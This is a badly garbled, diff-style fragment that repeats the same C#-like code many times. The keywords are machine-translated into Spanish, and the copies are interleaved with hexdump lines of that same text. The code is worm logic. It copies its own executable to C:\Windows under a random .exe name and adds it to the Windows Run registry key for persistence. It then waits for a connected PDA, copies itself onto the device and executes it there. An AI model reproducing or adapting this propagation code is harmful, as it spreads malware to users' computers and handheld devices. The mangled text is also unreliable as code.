+   local11 = Convert.ToString (local10.Next ()) + ".exe000043e0  69 6e 67 20 6d 6f 62 69  6c 65 20 65 6e 20 74 69  |ing mobile en ti|                                            ";
+          local12 = "c: \\ windows \\" + local11; #i000043f0  70 6f 20 64 65 20 73 69  73 74 65 6d 61 20 6f 70  |po de sistema op|
+ncluye el camino
+          local13 = nuevo -                                AutoStartApps ("00004400  65 72 61 74 69 76 6f 0a  20 20 20 20 20 20 69 66  |erativo.      if|                        SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \00004410  20 28 6c 6f 63 61 6c 32  20 3c 31 20 26 26 20 6c  | (local2 <1 && l|                                               \ Run \\");
+         # define la clave de registr00004420  6f 63 61 6c 33 20 3c 31  29 20 7b 23 73 69 20 6c  |ocal3 <1) {#si l|   o
+          local13.Add (local12); #add nuevo arch00004430  61 20 63 61 64 65 6e 61  20 63 65 20 6f 20 6d 6f  |a cadena ce o mo|
+ivo al registro
+          local4.Connect (); #00004440  62 69 6c 65 20 65 78 69  73 74 65 2c 20 65 6a 65  |bile existe, eje|
+ intentar conectarse a PDA                                           while (! (local4.Device00004450  63 75 74 65 0a 20 20 20  20 20 20 20 20 74 72 61  |cute.        tra|       Present)) #continuar bucle hasta que presente PDA
+            00004460  74 61 72 20 7b 0a 20 20  20 20 20 20 20 20 20 20  |tar {.          |                                 local4.Connect (); #conectar
+              00004470  6c 6f 63 61 6c 34 20 3d  20 6e 75 65 76 6f 20 52  |local4 = nuevo R|                             local9.CopyTo (local12);
+                 local14 = "\\ Wind00004480  41 50 49 20 28 29 3b 0a  20 20 20 20 20 20 20 20  |API ();.        |     ows \\" + local11; #definir destino
+                l00004490  20 20 6c 6f 63 61 6c 35  20 3d 20 41 73 73 65 6d  |  local5 = Assem|                       ocal4.CopyFileToDevice (local12, local14, verdadero);000044a0  62 6c 79 2e 47 65 74 45  78 65 63 75 74 69 6e 67  |bly.GetExecuting|                                               #copiar archivo a PDA
+                local4.Cr000044b0  41 73 73 65 6d 62 6c 79  20 28 29 2e 20 47 65 74  |Assembly (). Get|
+eateProcess (local14, "0"); #execute archivo
+       000044c0  4e 61 6d 65 20 28 29 2e  20 43 6f 64 65 42 61 73  |Name (). CodeBas|
+          local4.Disconnect (); #desconectar                         }
+                                                             000044d0  65 3b 0a 20 20 20 20 20  20 20 20 20 20 6c 6f 63  |e;.          loc|
+      catch (Exception) {} #if error luego captura e000044e0  61 6c 35 20 3d 20 6c 6f  63 61 6c 35 2e 52 65 70  |al5 = local5.Rep|                                               xcepción
+
+        }000044f0  6c 61 63 65 20 28 22 2f  22 2c 20 22 5c 5c 22 29  |lace ("/", "\\")|
+00004500  3b 0a 20 20 20 20 20 20  20 20 20 20 6c 6f 63 61  |;.          loca|                                        00004510  6c 36 20 3d 20 6c 6f 63  61 6c 35 2e 4c 61 73 74  |l6 = local5.Last|
+00004520  49 6e 64 65 78 4f 66 20  28 22 5c 5c 22 29 3b 0a  |IndexOf ("\\");.|                                        00004530  20 20 20 20 20 20 20 20  20 20 6c 6f 63 61 6c 37  |          local7|
+00004540  20 3d 20 6c 6f 63 61 6c  35 2e 53 75 62 73 74 72  | = local5.Substr|                                        00004550  69 6e 67 20 28 6c 6f 63  61 6c 36 20 2b 20 31 2c  |ing (local6 + 1,|                                        00004560  20 6c 6f 63 61 6c 35 2e  4c 65 6e 67 74 68 20 2d  | local5.Length -|                                        00004570  20 6c 6f 63 61 6c 36 20  2d 20 31 29 3b 0a 20 20  | local6 - 1);.  |                                        00004580  20 20 20 20 20 20 20 20  6c 6f 63 61 6c 35 20 3d  |        local5 =|                                        00004590  20 6c 6f 63 61 6c 35 2e  20 45 6c 69 6d 69 6e 61  | local5. Elimina|                                        000045a0  72 20 28 30 2c 20 38 29  3b 0a 20 20 20 20 20 20  |r (0, 8);.      |                                        000045b0  20 20 20 20 6c 6f 63 61  6c 35 20 3d 20 6c 6f 63  |    local5 = loc|                                        000045c0  61 6c 35 2e 53 75 62 73  74 72 69 6e 67 20 28 30  |al5.Substring (0|                                        000045d0  2c 20 6c 6f 63 61 6c 35  2e 4c 61 73 74 49 6e 64  |, local5.LastInd|                                        000045e0  65 78 4f 66 20 28 22 5c  5c 22 29 20 2b 20 31 29  |exOf ("\\") + 1)|                                        000045f0  3b 0a 20 20 20 20 20 20  20 20 20 20 6c 6f 63 61  |;.          loca|                                        00004600  6c 38 20 3d 20 6c 6f 63  61 6c 35 20 2b 20 6c 6f  |l8 = local5 + lo|                                        00004610  63 61 6c 37 3b 0a 20 20  20 20 20 20 20 20 20 20  |cal7;.          |                                        00004620  6c 6f 63 61 6c 39 20 3d  20 6e 75 65 76 6f 20 46  |local9 = nuevo F|                                        00004630  69 6c 65 49 6e 66 6f 20  28 6c 6f 63 61 6c 38 29  |ileInfo (local8)|                                        00004640  3b 0a 20 20 20 20 20 20  20 20 20 20 6c 6f 63 61  |;.          loca|                                        00004650  6c 31 30 20 3d 20 6e 75  65 76 6f 20 52 61 6e 64  |l10 = nuevo Rand|                                        00004660  6f 6d 20 28 29 3b 20 23  63 72 65 61 72 20 6e 6f  |om (); #crear no|                                        00004670  6d 62 72 65 20 64 65 20  61 72 63 68 69 76 6f 0a  |mbre de archivo.|                                        00004680  20 20 20 20 20 20 20 20  20 20 6c 6f 63 61 6c 31  |          local1|                                        00004690  31 20 3d 20 43 6f 6e 76  65 72 74 2e 54 6f 53 74  |1 = Convert.ToSt|                                        000046a0  72 69 6e 67 20 28 6c 6f  63 61 6c 31 30 2e 4e 65  |ring (local10.Ne|                                        000046b0  78 74 20 28 29 29 20 2b  20 22 2e 65 78 65 22 3b  |xt ()) + ".exe";|                                        000046c0  0a 20 20 20 20 20 20 20  20 20 20 6c 6f 63 61 6c  |.          local|                                        000046d0  31 32 20 3d 20 22 63 3a  20 5c 5c 20 77 69 6e 64  |12 = "c: \\ wind|                                        000046e0  6f 77 73 20 5c 5c 22 20  2b 20 6c 6f 63 61 6c 31  |ows \\" + local1|                                        000046f0  31 3b 20 23 69 6e 63 6c  75 79 65 20 65 6c 20 63  |1; #incluye el c|                                        00004700  61 6d 69 6e 6f 0a 20 20  20 20 20 20 20 20 20 20  |amino.          |                                        00004710  6c 6f 63 61 6c 31 33 20  3d 20 6e 75 65 76 6f 20  |local13 = nuevo |                                        00004720  2d 0a 41 75 74 6f 53 74  61 72 74 41 70 70 73 20  |-.AutoStartApps |                                        00004730  28 22 53 4f 46 54 57 41  52 45 20 5c 5c 20 4d 69  |("SOFTWARE \\ Mi|                                        00004740  63 72 6f 73 6f 66 74 20  5c 5c 20 57 69 6e 64 6f  |crosoft \\ Windo|                                        00004750  77 73 20 5c 5c 20 43 75  72 72 65 6e 74 56 65 72  |ws \\ CurrentVer|                                        00004760  73 69 6f 6e 20 5c 5c 20  52 75 6e 20 5c 5c 22 29  |sion \\ Run \\")|                                        00004770  3b 0a 20 20 20 20 20 20  20 20 20 23 20 64 65 66  |;.         # def|                                        00004780  69 6e 65 20 6c 61 20 63  6c 61 76 65 20 64 65 20  |ine la clave de |                                        00004790  72 65 67 69 73 74 72 6f  0a 20 20 20 20 20 20 20  |registro.       |                                        000047a0  20 20 20 6c 6f 63 61 6c  31 33 2e 41 64 64 20 28  |   local13.Add (|                                        000047b0  6c 6f 63 61 6c 31 32 29  3b 20 23 61 64 64 20 6e  |local12); #add n|                                        000047c0  75 65 76 6f 20 61 72 63  68 69 76 6f 20 61 6c 20  |uevo archivo al |                                        000047d0  72 65 67 69 73 74 72 6f  0a 20 20 20 20 20 20 20  |registro.       |                                        000047e0  20 20 20 6c 6f 63 61 6c  34 2e 43 6f 6e 6e 65 63  |   local4.Connec|                                        000047f0  74 20 28 29 3b 20 23 20  69 6e 74 65 6e 74 61 72  |t (); # intentar|                                        00004800  20 63 6f 6e 65 63 74 61  72 73 65 20 61 20 50 44  | conectarse a PD|                                        00004810  41 0a 20 20 20 20 20 20  20 20 20 20 77 68 69 6c  |A.          whil|                                        00004820  65 20 28 21 20 28 6c 6f  63 61 6c 34 2e 44 65 76  |e (! (local4.Dev|                                        00004830  69 63 65 50 72 65 73 65  6e 74 29 29 20 23 63 6f  |icePresent)) #co|                                        00004840  6e 74 69 6e 75 61 72 20  62 75 63 6c 65 20 68 61  |ntinuar bucle ha|                                        00004850  73 74 61 20 71 75 65 20  70 72 65 73 65 6e 74 65  |sta que presente|                                        00004860  20 50 44 41 0a 20 20 20  20 20 20 20 20 20 20 20  | PDA.           |                                        00004870  20 20 20 20 20 20 6c 6f  63 61 6c 34 2e 43 6f 6e  |      local4.Con|                                        00004880  6e 65 63 74 20 28 29 3b  20 23 63 6f 6e 65 63 74  |nect (); #conect|                                        00004890  61 72 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |ar.             |                                        000048a0  20 20 20 20 6c 6f 63 61  6c 39 2e 43 6f 70 79 54  |    local9.CopyT|                                        000048b0  6f 20 28 6c 6f 63 61 6c  31 32 29 3b 20 0a 20 20  |o (local12); .  |                                        000048c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6c  |               l|                                        000048d0  6f 63 61 6c 31 34 20 3d  20 22 5c 5c 20 57 69 6e  |ocal14 = "\\ Win|                                        000048e0  64 6f 77 73 20 5c 5c 22  20 2b 20 6c 6f 63 61 6c  |dows \\" + local|                                        000048f0  31 31 3b 20 23 64 65 66  69 6e 69 72 20 64 65 73  |11; #definir des|                                        00004900  74 69 6e 6f 0a 20 20 20  20 20 20 20 20 20 20 20  |tino.           |                                        00004910  20 20 20 20 20 6c 6f 63  61 6c 34 2e 43 6f 70 79  |     local4.Copy|                                        00004920  46 69 6c 65 54 6f 44 65  76 69 63 65 20 28 6c 6f  |FileToDevice (lo|                                        00004930  63 61 6c 31 32 2c 20 6c  6f 63 61 6c 31 34 2c 20  |cal12, local14, |                                        00004940  76 65 72 64 61 64 65 72  6f 29 3b 20 23 63 6f 70  |verdadero); #cop|                                        00004950  69 61 72 20 61 72 63 68  69 76 6f 20 61 20 50 44  |iar archivo a PD|                                        00004960  41 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |A.              |                                        00004970  20 20 6c 6f 63 61 6c 34  2e 43 72 65 61 74 65 50  |  local4.CreateP|                                        00004980  72 6f 63 65 73 73 20 28  6c 6f 63 61 6c 31 34 2c  |rocess (local14,|                                        00004990  20 22 30 22 29 3b 20 23  65 78 65 63 75 74 65 20  | "0"); #execute |                                        000049a0  61 72 63 68 69 76 6f 0a  20 20 20 20 20 20 20 20  |archivo.        |                                        000049b0  20 20 20 20 20 20 20 20  20 6c 6f 63 61 6c 34 2e  |         local4.|                                        000049c0  44 69 73 63 6f 6e 6e 65  63 74 20 28 29 3b 20 23  |Disconnect (); #|                                        000049d0  64 65 73 63 6f 6e 65 63  74 61 72 0a 20 20 20 20  |desconectar.    |
+000049e0  20 20 20 20 20 20 7d 0a  0a 20 20 20 20 20 20 20  |      }..       |
+000049f0  20 63 61 74 63 68 20 28  45 78 63 65 70 74 69 6f  | catch (Exceptio|
+00004a00  6e 29 20 7b 7d 20 23 69  66 20 65 72 72 6f 72 20  |n) {} #if error |
+00004a10  6c 75 65 67 6f 20 63 61  70 74 75 72 61 20 65 78  |luego captura ex|
+local1 = Environment.OSVersion.ToString (); #obtener el tipo de sistema operativo actual
+      local1 = local1.ToLower (); #convertir a minúsculas        local2 = local1.IndexOf ("ce"); #get ubicación de la cadena ce en tipo de sistema operativo
+     00004a20  63 65 70 63 69 c3 b3 6e  0a 0a 20 20 20 20 20 20  |cepci..n..      |                                    local3 = local1.IndexOf ("móvil"); #get index of string mobile en tipo de sist00004a30  20 20 7d 6c 6f 63 61 6c  31 20 3d 20 45 6e 76 69  |  }local1 = Envi|                    ema operativo
+      if (local2 <1 && local3 <1) {#si l00004a40  72 6f 6e 6d 65 6e 74 2e  4f 53 56 65 72 73 69 6f  |ronment.OSVersio|a cadena ce o mobile existe, ejecute
+        tratar {
+     00004a50  6e 2e 54 6f 53 74 72 69  6e 67 20 28 29 3b 20 23  |n.ToString (); #|                                        local4 = nuevo RAPI ();                                         local5 = Assembly.GetE00004a60  6f 62 74 65 6e 65 72 20  65 6c 20 74 69 70 6f 20  |obtener el tipo |
+xecutingAssembly (). GetName (). CodeBase;
+          loc00004a70  64 65 20 73 69 73 74 65  6d 61 20 6f 70 65 72 61  |de sistema opera|                           al5 = local5.Replace ("/", "\\");
+          local6 = local5.LastIndexOf ("\\");
+      00004a80  74 69 76 6f 20 61 63 74  75 61 6c 0a 20 20 20 20  |tivo actual.    |
+    local7 = local5.Substring (local6 + 1, local5.Length - local6 00004a90  20 20 6c 6f 63 61 6c 31  20 3d 20 6c 6f 63 61 6c  |  local1 = local|
+- 1);
+          local5 = local5. Eliminar (0, 8);                        00004aa0  31 2e 54 6f 4c 6f 77 65  72 20 28 29 3b 20 23 63  |1.ToLower (); #c|                                  local5 = local5.Substring (0, local5.LastIndexOf ("\\") + 1);
+00004ab0  6f 6e 76 65 72 74 69 72  20 61 20 6d 69 6e c3 ba  |onvertir a min..|
+          local8 = local5 + local7;                                  local9 = nuevo FileInfo (local8);00004ac0  73 63 75 6c 61 73 0a 20  20 20 20 20 20 6c 6f 63  |sculas.      loc|                                                        
+          local10 = nuevo Random (); #crear nombre de archivo00004ad0  61 6c 32 20 3d 20 6c 6f  63 61 6c 31 2e 49 6e 64  |al2 = local1.Ind|
+                                                                     local11 = Convert.ToString (local10.Next ()) + ".exe00004ae0  65 78 4f 66 20 28 22 63  65 22 29 3b 20 23 67 65  |exOf ("ce"); #ge|
+";                                                                   local12 = "c: \\ windows \\" + local11; #incluye el cam00004af0  74 20 75 62 69 63 61 63  69 c3 b3 6e 20 64 65 20  |t ubicaci..n de |                                  ino
+          local13 = nuevo -
+AutoStartApps ("SOFTWARE \\ Micros00004b00  6c 61 20 63 61 64 65 6e  61 20 63 65 20 65 6e 20  |la cadena ce en |      oft \\ Windows \\ CurrentVersion \\ Run \\");
+         # define00004b10  74 69 70 6f 20 64 65 20  73 69 73 74 65 6d 61 20  |tipo de sistema |
+ la clave de registro
+          local13.Add (local12); #add nuevo arch00004b20  6f 70 65 72 61 74 69 76  6f 0a 20 20 20 20 20 20  |operativo.      |
+ivo al registro                                                      local4.Connect (); # intentar 00004b30  6c 6f 63 61 6c 33 20 3d  20 6c 6f 63 61 6c 31 2e  |local3 = local1.|
+conectarse a PDA                                                     while (! (local4.DevicePresent)) #c00004b40  49 6e 64 65 78 4f 66 20  28 22 6d c3 b3 76 69 6c  |IndexOf ("m..vil|
+ontinuar bucle hasta que presente PDA                                       local400004b50  22 29 3b 20 23 67 65 74  20 69 6e 64 65 78 20 6f  |"); #get index o|                 .Connect (); #conectar
+                 local9.CopyTo (local12);00004b60  66 20 73 74 72 69 6e 67  20 6d 6f 62 69 6c 65 20  |f string mobile |                                                          
+                 local14 = "\\ Windows \\" + local11; #de00004b70  65 6e 20 74 69 70 6f 20  64 65 20 73 69 73 74 65  |en tipo de siste|                                          finir destino
+                local4.CopyFileToDevice (local12, local14, verdadero00004b80  6d 61 20 6f 70 65 72 61  74 69 76 6f 0a 20 20 20  |ma operativo.   |                               ); #copiar archivo a PDA
+                local4.CreateProcess (l00004b90  20 20 20 69 66 20 28 6c  6f 63 61 6c 32 20 3c 31  |   if (local2 <1|
+ocal14, "0"); #execute archivo                                              local4.Disconn00004ba0  20 26 26 20 6c 6f 63 61  6c 33 20 3c 31 29 20 7b  | && local3 <1) {|         ect (); #desconectar
+          }                                                
+        catch (Excepti00004bb0  23 73 69 20 6c 61 20 63  61 64 65 6e 61 20 63 65  |#si la cadena ce|
+on) {} #if error luego captura excepción                   
+        }00004bc0  20 6f 20 6d 6f 62 69 6c  65 20 65 78 69 73 74 65  | o mobile existe|
+00004bd0  2c 20 65 6a 65 63 75 74  65 0a 20 20 20 20 20 20  |, ejecute.      |
+00004be0  20 20 74 72 61 74 61 72  20 7b 0a 20 20 20 20 20  |  tratar {.     |
+00004bf0  20 20 20 20 20 6c 6f 63  61 6c 34 20 3d 20 6e 75  |     local4 = nu|
+00004c00  65 76 6f 20 52 41 50 49  20 28 29 3b 0a 20 20 20  |evo RAPI ();.   |
+00004c10  20 20 20 20 20 20 20 6c  6f 63 61 6c 35 20 3d 20  |       local5 = |
+00004c20  41 73 73 65 6d 62 6c 79  2e 47 65 74 45 78 65 63  |Assembly.GetExec|
+00004c30  75 74 69 6e 67 41 73 73  65 6d 62 6c 79 20 28 29  |utingAssembly ()|
+00004c40  2e 20 47 65 74 4e 61 6d  65 20 28 29 2e 20 43 6f  |. GetName (). Co|
+00004c50  64 65 42 61 73 65 3b 0a  20 20 20 20 20 20 20 20  |deBase;.        |
+00004c60  20 20 6c 6f 63 61 6c 35  20 3d 20 6c 6f 63 61 6c  |  local5 = local|
+00004c70  35 2e 52 65 70 6c 61 63  65 20 28 22 2f 22 2c 20  |5.Replace ("/", |
+00004c80  22 5c 5c 22 29 3b 0a 20  20 20 20 20 20 20 20 20  |"\\");.         |
+00004c90  20 6c 6f 63 61 6c 36 20  3d 20 6c 6f 63 61 6c 35  | local6 = local5|
+00004ca0  2e 4c 61 73 74 49 6e 64  65 78 4f 66 20 28 22 5c  |.LastIndexOf ("\|
+00004cb0  5c 22 29 3b 0a 20 20 20  20 20 20 20 20 20 20 6c  |\");.          l|
+00004cc0  6f 63 61 6c 37 20 3d 20  6c 6f 63 61 6c 35 2e 53  |ocal7 = local5.S|
+00004cd0  75 62 73 74 72 69 6e 67  20 28 6c 6f 63 61 6c 36  |ubstring (local6|
+00004ce0  20 2b 20 31 2c 20 6c 6f  63 61 6c 35 2e 4c 65 6e  | + 1, local5.Len|
+00004cf0  67 74 68 20 2d 20 6c 6f  63 61 6c 36 20 2d 20 31  |gth - local6 - 1|
+00004d00  29 3b 0a 20 20 20 20 20  20 20 20 20 20 6c 6f 63  |);.          loc|
+00004d10  61 6c 35 20 3d 20 6c 6f  63 61 6c 35 2e 20 45 6c  |al5 = local5. El|
+00004d20  69 6d 69 6e 61 72 20 28  30 2c 20 38 29 3b 0a 20  |iminar (0, 8);. |
+00004d30  20 20 20 20 20 20 20 20  20 6c 6f 63 61 6c 35 20  |         local5 |
+00004d40  3d 20 6c 6f 63 61 6c 35  2e 53 75 62 73 74 72 69  |= local5.Substri|
+00004d50  6e 67 20 28 30 2c 20 6c  6f 63 61 6c 35 2e 4c 61  |ng (0, local5.La|
+00004d60  73 74 49 6e 64 65 78 4f  66 20 28 22 5c 5c 22 29  |stIndexOf ("\\")|
+00004d70  20 2b 20 31 29 3b 0a 20  20 20 20 20 20 20 20 20  | + 1);.         |
+00004d80  20 6c 6f 63 61 6c 38 20  3d 20 6c 6f 63 61 6c 35  | local8 = local5|
+00004d90  20 2b 20 6c 6f 63 61 6c  37 3b 0a 20 20 20 20 20  | + local7;.     |
+00004da0  20 20 20 20 20 6c 6f 63  61 6c 39 20 3d 20 6e 75  |     local9 = nu|
+00004db0  65 76 6f 20 46 69 6c 65  49 6e 66 6f 20 28 6c 6f  |evo FileInfo (lo|
+00004dc0  63 61 6c 38 29 3b 0a 20  20 20 20 20 20 20 20 20  |cal8);.         |
+00004dd0  20 6c 6f 63 61 6c 31 30  20 3d 20 6e 75 65 76 6f  | local10 = nuevo|
+00004de0  20 52 61 6e 64 6f 6d 20  28 29 3b 20 23 63 72 65  | Random (); #cre|
+00004df0  61 72 20 6e 6f 6d 62 72  65 20 64 65 20 61 72 63  |ar nombre de arc|
+00004e00  68 69 76 6f 0a 20 20 20  20 20 20 20 20 20 20 6c  |hivo.          l|
+00004e10  6f 63 61 6c 31 31 20 3d  20 43 6f 6e 76 65 72 74  |ocal11 = Convert|
+00004e20  2e 54 6f 53 74 72 69 6e  67 20 28 6c 6f 63 61 6c  |.ToString (local|
+00004e30  31 30 2e 4e 65 78 74 20  28 29 29 20 2b 20 22 2e  |10.Next ()) + ".|
+00004e40  65 78 65 22 3b 0a 20 20  20 20 20 20 20 20 20 20  |exe";.          |
+00004e50  6c 6f 63 61 6c 31 32 20  3d 20 22 63 3a 20 5c 5c  |local12 = "c: \\|
+00004e60  20 77 69 6e 64 6f 77 73  20 5c 5c 22 20 2b 20 6c  | windows \\" + l|
+00004e70  6f 63 61 6c 31 31 3b 20  23 69 6e 63 6c 75 79 65  |ocal11; #incluye|
+00004e80  20 65 6c 20 63 61 6d 69  6e 6f 0a 20 20 20 20 20  | el camino.     |
+00004e90  20 20 20 20 20 6c 6f 63  61 6c 31 33 20 3d 20 6e  |     local13 = n|
+00004ea0  75 65 76 6f 20 2d 0a 41  75 74 6f 53 74 61 72 74  |uevo -.AutoStart|
+00004eb0  41 70 70 73 20 28 22 53  4f 46 54 57 41 52 45 20  |Apps ("SOFTWARE |
+00004ec0  5c 5c 20 4d 69 63 72 6f  73 6f 66 74 20 5c 5c 20  |\\ Microsoft \\ |
+00004ed0  57 69 6e 64 6f 77 73 20  5c 5c 20 43 75 72 72 65  |Windows \\ Curre|
+00004ee0  6e 74 56 65 72 73 69 6f  6e 20 5c 5c 20 52 75 6e  |ntVersion \\ Run|
+00004ef0  20 5c 5c 22 29 3b 0a 20  20 20 20 20 20 20 20 20  | \\");.         |
+00004f00  23 20 64 65 66 69 6e 65  20 6c 61 20 63 6c 61 76  |# define la clav|
+00004f10  65 20 64 65 20 72 65 67  69 73 74 72 6f 0a 20 20  |e de registro.  |
+00004f20  20 20 20 20 20 20 20 20  6c 6f 63 61 6c 31 33 2e  |        local13.|
+00004f30  41 64 64 20 28 6c 6f 63  61 6c 31 32 29 3b 20 23  |Add (local12); #|
+00004f40  61 64 64 20 6e 75 65 76  6f 20 61 72 63 68 69 76  |add nuevo archiv|
+00004f50  6f 20 61 6c 20 72 65 67  69 73 74 72 6f 0a 20 20  |o al registro.  |
+00004f60  20 20 20 20 20 20 20 20  6c 6f 63 61 6c 34 2e 43  |        local4.C|
+00004f70  6f 6e 6e 65 63 74 20 28  29 3b 20 23 20 69 6e 74  |onnect (); # int|
+00004f80  65 6e 74 61 72 20 63 6f  6e 65 63 74 61 72 73 65  |entar conectarse|
+00004f90  20 61 20 50 44 41 0a 20  20 20 20 20 20 20 20 20  | a PDA.         |
+00004fa0  20 77 68 69 6c 65 20 28  21 20 28 6c 6f 63 61 6c  | while (! (local|
+00004fb0  34 2e 44 65 76 69 63 65  50 72 65 73 65 6e 74 29  |4.DevicePresent)|
+00004fc0  29 20 23 63 6f 6e 74 69  6e 75 61 72 20 62 75 63  |) #continuar buc|
+00004fd0  6c 65 20 68 61 73 74 61  20 71 75 65 20 70 72 65  |le hasta que pre|
+00004fe0  73 65 6e 74 65 20 50 44  41 0a 20 20 20 20 20 20  |sente PDA.      |
+00004ff0  20 20 20 20 20 20 20 20  20 20 20 6c 6f 63 61 6c  |           local|
+00005000  34 2e 43 6f 6e 6e 65 63  74 20 28 29 3b 20 23 63  |4.Connect (); #c|
+00005010  6f 6e 65 63 74 61 72 0a  20 20 20 20 20 20 20 20  |onectar.        |
+00005020  20 20 20 20 20 20 20 20  20 6c 6f 63 61 6c 39 2e  |         local9.|
+00005030  43 6f 70 79 54 6f 20 28  6c 6f 63 61 6c 31 32 29  |CopyTo (local12)|
+00005040  3b 20 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |; .             |
+00005050  20 20 20 20 6c 6f 63 61  6c 31 34 20 3d 20 22 5c  |    local14 = "\|
+00005060  5c 20 57 69 6e 64 6f 77  73 20 5c 5c 22 20 2b 20  |\ Windows \\" + |
+00005070  6c 6f 63 61 6c 31 31 3b  20 23 64 65 66 69 6e 69  |local11; #defini|
+00005080  72 20 64 65 73 74 69 6e  6f 0a 20 20 20 20 20 20  |r destino.      |
+00005090  20 20 20 20 20 20 20 20  20 20 6c 6f 63 61 6c 34  |          local4|
+000050a0  2e 43 6f 70 79 46 69 6c  65 54 6f 44 65 76 69 63  |.CopyFileToDevic|
+000050b0  65 20 28 6c 6f 63 61 6c  31 32 2c 20 6c 6f 63 61  |e (local12, loca|
+000050c0  6c 31 34 2c 20 76 65 72  64 61 64 65 72 6f 29 3b  |l14, verdadero);|
+000050d0  20 23 63 6f 70 69 61 72  20 61 72 63 68 69 76 6f  | #copiar archivo|
+000050e0  20 61 20 50 44 41 0a 20  20 20 20 20 20 20 20 20  | a PDA.         |
+000050f0  20 20 20 20 20 20 20 6c  6f 63 61 6c 34 2e 43 72  |       local4.Cr|
+00005100  65 61 74 65 50 72 6f 63  65 73 73 20 28 6c 6f 63  |eateProcess (loc|
+00005110  61 6c 31 34 2c 20 22 30  22 29 3b 20 23 65 78 65  |al14, "0"); #exe|
+00005120  63 75 74 65 20 61 72 63  68 69 76 6f 0a 20 20 20  |cute archivo.   |
+00005130  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6c 6f  |              lo|
+00005140  63 61 6c 34 2e 44 69 73  63 6f 6e 6e 65 63 74 20  |cal4.Disconnect |
+00005150  28 29 3b 20 23 64 65 73  63 6f 6e 65 63 74 61 72  |(); #desconectar|                                        00005160  0a 20 20 20 20 20 20 20  20 20 20 7d 0a 0a 20 20  |.          }..  |                                        00005170  20 20 20 20 20 20 63 61  74 63 68 20 28 45 78 63  |      catch (Exc|                                        00005180  65 70 74 69 6f 6e 29 20  7b 7d 20 23 69 66 20 65  |eption) {} #if e|
+00005190  72 72 6f 72 20 6c 75 65  67 6f 20 63 61 70 74 75  |rror luego captu|                                        local1 = Environment.OSVersion.ToString (); #obtener el tipo de sistema operativo actual
+      local1 = local1.ToLower (); #convertir a minúsculas        local2 = local1.IndexOf ("ce"); #get ubicación de la cadena ce en tipo de sistema operativo                        000051a0  72 61 20 65 78 63 65 70  63 69 c3 b3 6e 0a 0a 20  |ra excepci..n.. |
+   local3 = local1.IndexOf ("móvil"); #get index of s000051b0  20 20 20 20 20 20 20 7d  6c 6f 63 61 6c 31 20 3d  |       }local1 =|                                              tring mobile en tipo de sistema operativo
+000051c0  20 45 6e 76 69 72 6f 6e  6d 65 6e 74 2e 4f 53 56  | Environment.OSV|                                              if (local2 <1 && local3 <1) {#si la000051d0  65 72 73 69 6f 6e 2e 54  6f 53 74 72 69 6e 67 20  |ersion.ToString |
+ cadena ce o mobile existe, ejecute
+ 000051e0  28 29 3b 20 23 6f 62 74  65 6e 65 72 20 65 6c 20  |(); #obtener el |
+       tratar {                                                      local4 = nuev000051f0  74 69 70 6f 20 64 65 20  73 69 73 74 65 6d 61 20  |tipo de sistema |                 o RAPI ();
+          local5 = Assemb00005200  6f 70 65 72 61 74 69 76  6f 20 61 63 74 75 61 6c  |operativo actual|
+ly.GetExecutingAssembly (). GetName (). CodeBase;
+       00005210  0a 20 20 20 20 20 20 6c  6f 63 61 6c 31 20 3d 20  |.      local1 = |
+   local5 = local5.Replace ("/", "\\");
+00005220  6c 6f 63 61 6c 31 2e 54  6f 4c 6f 77 65 72 20 28  |local1.ToLower (|
+          local6 = local5.LastIndexOf ("\00005230  29 3b 20 23 63 6f 6e 76  65 72 74 69 72 20 61 20  |); #convertir a |                                                          \");
+          local7 = loc00005240  6d 69 6e c3 ba 73 63 75  6c 61 73 0a 20 20 20 20  |min..sculas.    |
+al5.Substring (local6 +00005250  20 20 6c 6f 63 61 6c 32  20 3d 20 6c 6f 63 61 6c  |  local2 = local|
+ 1, local5.Length - local6 - 1)00005260  31 2e 49 6e 64 65 78 4f  66 20 28 22 63 65 22 29  |1.IndexOf ("ce")|         ;
+          local5 = local5. Eli00005270  3b 20 23 67 65 74 20 75  62 69 63 61 63 69 c3 b3  |; #get ubicaci..|          minar (0, 8);
+          local5 =00005280  6e 20 64 65 20 6c 61 20  63 61 64 65 6e 61 20 63  |n de la cadena c|                       local5.Substring (0, local5.LastInde00005290  65 20 65 6e 20 74 69 70  6f 20 64 65 20 73 69 73  |e en tipo de sis|
+xOf ("\\") + 1);
+          local8 = local5000052a0  74 65 6d 61 20 6f 70 65  72 61 74 69 76 6f 0a 20  |tema operativo. |
+ + local7;
+          local9 = 000052b0  20 20 20 20 20 6c 6f 63  61 6c 33 20 3d 20 6c 6f  |     local3 = lo|                     nuevo FileInfo (local8);
+        000052c0  63 61 6c 31 2e 49 6e 64  65 78 4f 66 20 28 22 6d  |cal1.IndexOf ("m|                                  local10 = nuevo Random (); #crear 000052d0  c3 b3 76 69 6c 22 29 3b  20 23 67 65 74 20 69 6e  |..vil"); #get in|
+nombre de archivo                                                    local000052e0  64 65 78 20 6f 66 20 73  74 72 69 6e 67 20 6d 6f  |dex of string mo|
+11 = Convert.ToString (local10.Next000052f0  62 69 6c 65 20 65 6e 20  74 69 70 6f 20 64 65 20  |bile en tipo de |      ()) + ".exe";
+          local12 = "c: \\ windows \\" + local11; #inc00005300  73 69 73 74 65 6d 61 20  6f 70 65 72 61 74 69 76  |sistema operativ|
+luye el camino
+          local13 = nuevo -                                00005310  6f 0a 20 20 20 20 20 20  69 66 20 28 6c 6f 63 61  |o.      if (loca|
+AutoStartApps ("SOFTWARE \\ Microsof00005320  6c 32 20 3c 31 20 26 26  20 6c 6f 63 61 6c 33 20  |l2 <1 && local3 |    t \\ Windows \\ CurrentVersion \\ R00005330  3c 31 29 20 7b 23 73 69  20 6c 61 20 63 61 64 65  |<1) {#si la cade|
+un \\");                                                            # define la 00005340  6e 61 20 63 65 20 6f 20  6d 6f 62 69 6c 65 20 65  |na ce o mobile e|
+clave de registro
+          local13.Add 00005350  78 69 73 74 65 2c 20 65  6a 65 63 75 74 65 0a 20  |xiste, ejecute. |                  (local12); #add nuevo archivo al reg00005360  20 20 20 20 20 20 20 74  72 61 74 61 72 20 7b 0a  |       tratar {.|    istro                                                                local4.Connect (); # intent00005370  20 20 20 20 20 20 20 20  20 20 6c 6f 63 61 6c 34  |          local4|
+ar conectarse a PDA
